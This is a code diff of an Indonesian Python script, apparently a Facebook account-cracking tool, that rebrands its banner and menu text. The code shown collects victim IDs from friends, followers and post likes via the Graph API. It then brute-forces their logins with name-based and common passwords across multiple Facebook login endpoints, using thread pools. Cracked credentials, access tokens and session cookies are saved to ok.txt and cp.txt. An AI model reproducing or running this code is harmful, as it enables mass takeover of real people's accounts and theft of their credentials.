@@ -68,21 +68,41 @@ tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 tgl = ("%s %s %s"%(ha, op, ta))
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 
-banner = ("""\033[1;37m
-   ______\033[1;91m   __ __ \033[1;37m            __  
-  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
- / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
-/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32mDekura-X.\033[1;37m
-\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n
-  \033[1;33m•\033[1;91m•\033[1;37m New Tools Hack Facebook Random \033[1;33m•\033[1;91m•\033[1;37m
- \033[1;33m•\033[1;91m•\033[1;37m Gunakan Akun Tumbal Untuk Login! \033[1;33m•\033[1;91m•\033[1;37m""")
+banner = ("""\033[1;36m
+\033[1;36m $$$$$$\                                      $$\ 
+\033[1;36m$$  __$$\                                     $$ |
+\033[1;36m$$ /  \__| $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$ |
+\033[1;36m\$$$$$$\  $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$ |
+\033[1;36m \____$$\ $$ /  $$ |$$$$$$$$ |$$$$$$$$ |$$ /  $$ |
+\033[1;36m$$\   $$ |$$ |  $$ |$$   ____|$$   ____|$$ |  $$ |
+\033[1;36m\$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\ \$$$$$$$ |
+\033[1;36m \______/ $$  ____/  \_______| \_______| \_______|
+\033[1;36m          $$ |                                    
+\033[1;36m          $$ |                                    
+\033[1;36m          \__|               
+\x1b[1;92m_______________________________________________________\n
+\x1b[1;97m Desigen By  : \x1b[1;92mRaka Andrian Tara
+\x1b[1;97m Github      : \x1b[1;92mBajingan-Z
+\x1b[1;97m Coded By    : \x1b[1;92mRaka \x1b[1;97m& \x1b[1;32mAngga
+\x1b[1;92m_______________________________________________________\x1b[1;97m            \n"""         
 
-logo = """\033[1;37m
-   ______\033[1;91m   __ __ \033[1;37m            __  
-  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
- / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
-/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32mDekura-X.\033[1;37m
-\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n"""
+logo = """\033[1;36m
+\033[1;36m $$$$$$\                                      $$\ 
+\033[1;36m$$  __$$\                                     $$ |
+\033[1;36m$$ /  \__| $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$ |
+\033[1;36m\$$$$$$\  $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$ |
+\033[1;36m \____$$\ $$ /  $$ |$$$$$$$$ |$$$$$$$$ |$$ /  $$ |
+\033[1;36m$$\   $$ |$$ |  $$ |$$   ____|$$   ____|$$ |  $$ |
+\033[1;36m\$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\ \$$$$$$$ |
+\033[1;36m \______/ $$  ____/  \_______| \_______| \_______|
+\033[1;36m          $$ |                                    
+\033[1;36m          $$ |                                    
+\033[1;36m          \__|               
+\x1b[1;92m_______________________________________________________\n
+\x1b[1;97m Desigen By  : \x1b[1;92mRaka Andrian Tara
+\x1b[1;97m Github      : \x1b[1;92mBajingan-Z
+\x1b[1;97m Coded By    : \x1b[1;92mRaka \x1b[1;97m& \x1b[1;32mAngga
+\x1b[1;92m_______________________________________________________\x1b[1;97m            \n"""         
 
 def clear():
 	if " linux" in sys.platform.lower():
@@ -169,17 +189,17 @@ def menu():
         print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
     os.system("clear");print(logo)
     print("\033[1;96m"+50*"-")
-    print("%s [%s•%s] Nickname      : %s "%(p,b,p,nick));print("%s [%s•%s] ID facebook   : %s "%(p,b,p,idme));print("%s [%s•%s] Tanggal lahir : %s %s %s"%(p,b,p,day,month,year))
+    print("%s [%s•%s] Name      : %s "%(p,b,p,nick));print("%s [%s•%s] Usert ID   : %s "%(p,b,p,idme));print("%s [%s•%s] Tanggal Lahir : %s %s %s"%(p,b,p,day,month,year))
     print("\033[1;96m"+50*"-")
-    print("\n%s [%s01%s] Crack fb dari list teman sendiri "%(p,b,p))
-    print("%s [%s02%s] Crack fb dari list teman publik "%(p,b,p))
-    print("%s [%s03%s] Crack fb dari follower publik "%(p,b,p))
-    print("%s [%s04%s] Crack fb dari like publik"%(p,b,p))
-    print("%s [%s05%s] Crack fb massal publik"%(p,b,p))
-    print("%s [%s06%s] Cek opsi akun sesi hasil crack"%(p,b,p))
-    print("%s [%s07%s] Setting useragent"%(p,b,p))
-    print("%s [%s99%s] Cek hasil crack ok-cp"%(p,b,p))
-    print("%s [%s00%s] Logout dari akun ini"%(p,b,p))
+    print("\n%s [%s1%s] Crack Dari Teman Sendiri "%(p,b,p))
+    print("%s [%s2%s] Crack Dari Teman Publik "%(p,b,p))
+    print("%s [%s3%s] Crack Dari follower Publik "%(p,b,p))
+    print("%s [%s4%s] Crack Dari Like Publik"%(p,b,p))
+    print("%s [%s5%s] Crack Id Massal Publik"%(p,b,p))
+    print("%s [%s6%s] Cek Opsi Akun Sesi"%(p,b,p))
+    print("%s [%s7%s] Setting Useragent"%(p,b,p))
+    print("%s [%s8%s] Cek Hasil Crack Ok-Cp"%(p,b,p))
+    print("%s [%s0%s] Logout"%(p,b,p))
     pill = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
     if pill in ["1","01"]:
         teman()
@@ -200,7 +220,7 @@ def menu():
         cek_opsi_sesi()
     elif pill in ["7","07"]:
         setting()
-    elif pill in ["99"]:
+    elif pill in ["8","08"]:
         results()
     elif pill in ["0","00"]:
         os.system("rm -rf login.txt")
@@ -223,7 +243,7 @@ def teman():
     if (len(id)) == 0:
         exit('\n%s [%s!%s] Maaf pertemanan target adalah 0'%(p,m,p))
     else:
-        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))
+        print("\n%s [%s•%s] Total Id : %s"%(p,b,p,(len(id))))
 
 
 def publik():
@@ -232,7 +252,7 @@ def publik():
         token = open("login.txt", "r").read()
     except IOError:
         print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
-    idt=raw_input("\n%s [%s•%s] Masukan id target\n [%s•%s] ID target: "%(p,b,p,b,p))
+    idt=raw_input("%s [%s•%s] Masukan Id Target\n [%s•%s] ID Target: "%(p,b,p,b,p))
     try:
         for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt,token)).json()["data"]:
             idne = i['id']
@@ -243,7 +263,7 @@ def publik():
     if (len(id)) == 0:
         exit('\n%s [%s!%s] Maaf pertemanan target adalah 0'%(p,m,p))
     else:
-        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))
+        print("\n%s [%s•%s] Total Id : %s"%(p,b,p,(len(id))))
 
 
 def followers():
@@ -252,7 +272,7 @@ def followers():
         token = open("login.txt", "r").read()
     except IOError:
         print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
-    idt=raw_input("\n%s [%s•%s] Masukan id target\n [%s•%s] ID target: "%(p,b,p,b,p))
+    idt=raw_input("%s [%s•%s] Masukan Id Target\n [%s•%s] ID Target: "%(p,b,p,b,p))
     try:
         for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(idt,token)).json()["data"]:
             idne = i['id']
@@ -263,7 +283,7 @@ def followers():
     if (len(id)) == 0:
         exit('\n%s [%s!%s] Maaf followers target adalah 0'%(p,m,p))
     else:
-        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))
+        print("\n%s [%s•%s] Total Id : %s"%(p,b,p,(len(id))))
 
 def likes():
     global token
@@ -271,7 +291,7 @@ def likes():
         token = open("login.txt", "r").read()
     except IOError:
         print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
-    idt=raw_input("\n%s [%s•%s] Masukan id postingan\n [%s•%s] ID post target: "%(p,b,p,b,p))
+    idt=raw_input("%s [%s•%s] Masukan Id Postingan\n [%s•%s] ID Post Target: "%(p,b,p,b,p))
     try:
         for i in requests.get("https://graph.facebook.com/%s/likes?limit=100000&access_token=%s"%(idt,token)).json()["data"]:
             idne = i['id']
@@ -282,7 +302,7 @@ def likes():
     if (len(id)) == 0:
         exit('\n%s [%s!%s] Maaf likes target adalah 0'%(p,m,p))
     else:
-        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))
+        print("\n%s [%s•%s] Total Id : %s"%(p,b,p,(len(id))))
 
 def massal():
 	global token
@@ -295,7 +315,7 @@ def massal():
 	except:tanya_total=1
 	for t in range(tanya_total):
 		t +=1
-		idt=raw_input("\n%s [%s•%s] Masukan id target\n [%s•%s] ID target%s: "%(p,b,p,b,p,t))
+		idt=raw_input("%s [%s•%s] Masukan Id Target\n [%s•%s] ID Target%s: "%(p,b,p,b,p,t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				idne = i["id"]
@@ -306,13 +326,13 @@ def massal():
 	if (len(id)) == 0:
 		exit('\n%s [%s!%s] Maaf pertemanan target adalah 0'%(p,m,p))
 	else:
-		print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))
+		print("\n%s [%s•%s] Total Id : %s"%(p,b,p,(len(id))))
 
 def dekura_x():
 	print("\n%s [%s Select methode crack %s]%s"%(b,p,b,p))
-	print("%s [%s1%s] Crack pake api.fb (%sfast%s)"%(p,b,p,b,p))
-	print("%s [%s2%s] Crack pake mbasic.fb (%srekomendasi%s)"%(p,b,p,b,p))
-	print("%s [%s3%s] Crack pake mobile.fb\n"%(p,b,p))
+	print("%s [%s1%s] Methode B-api (%sCepat%s)"%(p,b,p,b,p))
+	print("%s [%s2%s] Methode Mbasic (%sSlow Rekomend%s)"%(p,b,p,b,p))
+	print("%s [%s3%s] Methode Mobile (%sSlow%s\n)"%(p,b,p,b,p))
 	dekurasayangara = raw_input("%s [%s•%s] Choose: "%(p,b,p))
 	if dekurasayangara in [""]:
 		exit("\n%s [%s!%s] Pilihan tidak boleh kosong!"%(p,m,p))
@@ -324,7 +344,7 @@ def dekura_x():
 				if len(asu) =="":
 					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
 				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
-				print("%s [%s•%s] Mode pesawat 5/10 sec jika tidak ada hasil!\n"%(p,b,p))
+				print("%s [%s•%s] Mode Pesawat 3 Detik Jika Tidak Ada Hasil!\n"%(p,b,p))
 				for user in id:
 					uid, name = user.split("<=>")
 					coeg.submit(api, uid, asu)
@@ -332,7 +352,7 @@ def dekura_x():
 		elif bukanmaen in ["d","D"]:
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
-				print("%s [%s•%s] Mode pesawat 5/10 sec jika tidak ada hasil!\n"%(p,b,p))
+				print("%s [%s•%s] Mode Pesawat 3 Detik Jika Tidak Ada Hasil!\n"%(p,b,p))
 				for user in id:
 					uid, name = user.split("<=>")
 					frist=name.split(" ")
@@ -343,7 +363,7 @@ def dekura_x():
 					elif len(frist)<=3:
 						dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 					else:
-						dekura = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
+						dekura = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "pakistan" ]
 					coeg.submit(api, uid, dekura)
 			hasil()
 
@@ -354,16 +374,16 @@ def dekura_x():
 				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
 				if len(asu) =="":
 					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
-				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
-				print("%s [%s•%s] Mode pesawat 5/10 sec jika tidak ada hasil!\n"%(p,b,p))
+				print("\n%s [%s•%s] Hasil Ok Tersimpan Di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
+				print("%s [%s•%s] Mode Pesawat 3 Detik Jika Tidak Ada Hasil!\n"%(p,b,p))
 				for user in id:
 					uid, name = user.split("<=>")
 					coeg.submit(mbasic, uid, asu)
 			hasil()
 		elif bukanmaen == "d":
 			with ThreadPoolExecutor(max_workers=35) as coeg:
-				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
-				print("%s [%s•%s] Mode pesawat 5/10 sec jika tidak ada hasil!\n"%(p,b,p))
+				print("\n%s [%s•%s] Hasil Ok Tersimpan Di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
+				print("%s [%s•%s] Mode Pesawat 3 Detik Jika Tidak Ada Hasil!\n"%(p,b,p))
 				for user in id:
 					uid, name = user.split("<=>")
 					frist=name.split(" ")
@@ -374,7 +394,7 @@ def dekura_x():
 					elif len(frist)<=3:
 						dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 					else:
-						dekura = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
+						dekura = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "pakistan" ]
 					coeg.submit(mbasic, uid, dekura)
 			hasil()
 
@@ -385,16 +405,16 @@ def dekura_x():
 				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
 				if len(asu) =="":
 					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
-				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
-				print("%s [%s•%s] Mode pesawat 5/10 sec jika tidak ada hasil!\n"%(p,b,p))
+				print("\n%s [%s•%s] Hasil Ok Tersimpan Di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
+				print("%s [%s•%s] Mode Pesawat 3 Detik Jika Tidak Ada Hasil!\n"%(p,b,p))
 				for user in id:
 					uid, name = user.split("<=>")
 					coeg.submit(freefb, uid, asu)
 			hasil()
 		elif bukanmaen == "d":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
-				print("%s [%s•%s] Mode pesawat 5/10 sec jika tidak ada hasil!\n"%(p,b,p))
+				print("\n%s [%s•%s] Hasil Ok Tersimpan Di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p,p,b,p))
+				print("%s [%s•%s] Mode Pesawat 3 Detik Jika Tidak Ada Hasil!\n"%(p,b,p))
 				for user in id:
 					uid, name = user.split("<=>")
 					frist=name.split(" ")
@@ -423,7 +443,7 @@ def api(uid, dekura):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global ok, cp, loop, token
 	sys.stdout.write(
-		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r [Crack] %s/%s [OK:-%s] - [CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	for pw in dekura:
 		pw = pw.lower()
@@ -431,7 +451,7 @@ def api(uid, dekura):
 		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 		if "session_key" in send.text and "EAAA" in send.text:
-			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+			print("\r \x1b[1;32m[RAKA_AMANDA] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
 			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
 			break
@@ -442,7 +462,7 @@ def api(uid, dekura):
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
+					print("\r\x1b[1;33m [RAKA_AMANDA] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
 					cp.append("%s|%s"%(uid, pw))
 					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
 					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
@@ -452,7 +472,7 @@ def api(uid, dekura):
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
+			print("\r\x1b[1;33m [RAKA_AMANDA] %s • %s\033[0;97m        "%(uid, pw))
 			cp.append("%s|%s"%(uid, pw))
 			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
 			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
@@ -469,7 +489,7 @@ def mbasic(uid, dekura):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global ok, cp, loop, token
 	sys.stdout.write(
-		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r [Crack] %s/%s [OK:-%s] - [CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	for pw in dekura:
 		kwargs = {}
@@ -488,7 +508,7 @@ def mbasic(uid, dekura):
 		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+			print("\r \x1b[1;32m[RAKA_AMANDA] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
 			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
 			break
@@ -499,7 +519,7 @@ def mbasic(uid, dekura):
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
+					print("\r\x1b[1;33m [RAKA_AMANDA] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
 					cp.append("%s|%s"%(uid, pw))
 					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
 					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
@@ -509,7 +529,7 @@ def mbasic(uid, dekura):
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
+			print("\r\x1b[1;33m [RAKA_AMANDA] %s • %s\033[0;97m        "%(uid, pw))
 			cp.append("%s|%s"%(uid, pw))
 			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
 			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
@@ -526,7 +546,7 @@ def mobile(uid, dekura):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global ok, cp, loop, token
 	sys.stdout.write(
-		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r [Crack] %s/%s [OK:-%s] - [CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	for pw in dekura:
 		kwargs = {}
@@ -545,7 +565,7 @@ def mobile(uid, dekura):
 		deku = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+			print("\r \x1b[1;32m[RAKA_AMANDA] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
 			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
 			break
@@ -556,7 +576,7 @@ def mobile(uid, dekura):
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
+					print("\r\x1b[1;33m [RAKA_AMANDA] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
 					cp.append("%s|%s"%(uid, pw))
 					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
 					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
@@ -566,7 +586,7 @@ def mobile(uid, dekura):
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
+			print("\r\x1b[1;33m [RAKA_AMANDA] %s • %s\033[0;97m        "%(uid, pw))
 			cp.append("%s|%s"%(uid, pw))
 			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
 			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
@@ -580,7 +600,7 @@ def hasil():
 	if len(ok) != 0 or len(cp) != 0:
 		exit(prem.awokawokaowkwoawkwowksheheheiwoansvdejeike_dekura_sayang())
 	else:
-		exit("\n%s [%s•%s] Lah? Kok Gak Dapat Hasil :v\n%s [%s!%s] Makanya Gans Biar Dapat Result :v"%(p,b,p,p,m,p))
+		exit("\n%s [%s•%s] Kalau Ga Ada Hasil Dicoba Lagi Teman\n%s [%s!%s] Makanya Gans Biar Dapat Result :v"%(p,b,p,p,m,p))
 
 def awokawokaowkwoawkwowksheheheiwoansvdejeike_dekura_sayang():
     global token
@@ -611,7 +631,7 @@ def option_sesi():
 		except requests.exceptions.ConnectionError:
 			pass
 	os.remove('checkcp.txt')
-	exit("\n%s [%s!%s] Done Ya Anjing"%(p,m,p))
+	exit("\n%s [%s!%s] Simpan Hasil Crack Selama 5/7 Hari"%(p,m,p))
 
 def dekura_chann(user, pasw):
 	mb = ("https://mbasic.facebook.com")
@@ -674,7 +694,7 @@ def cek_opsi_sesi():
 		except requests.exceptions.ConnectionError:
 			pass
 	os.remove('cp.txt')
-	exit("\n%s [%s!%s] Done Ya Anjing"%(p,m,p))
+	exit("\n%s [%s!%s] Simpan Hasil Crack Selama 5/7 Hari"%(p,m,p))
 
 def dekucheck(user, pasw):
 	mb = ("https://mbasic.facebook.com")
@@ -751,7 +771,7 @@ def setting():
         user_deku = raw_input("\n%s [%s•%s] Masukan user agent mu\n %s[%s•%s] User agent: "%(p,b,p,p,b,p))
         print("%s [%s•%s] Please Wait!"%(p,b,p));time.sleep(1.5)
         open("ua","w").write(user_deku)
-        print("%s [%s•%s] Berhasil set user agent"%(p,b,p))
+        print("%s [%s•%s] Berhasil Set User Agent"%(p,b,p))
         raw_input("%s [Back]"%(p))
         menu()
     elif cek_deku in ["2","02"]:
@@ -759,7 +779,7 @@ def setting():
             ua = open("ua", "r").read()
         except IOError:
             ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
-        print("%s [%s•%s] User agent sekrng: %s"%(p,b,p,ua))
+        print("%s [%s•%s] User Agent Sekrng: %s"%(p,b,p,ua))
 
 
 def cek_folder_ok_cp():
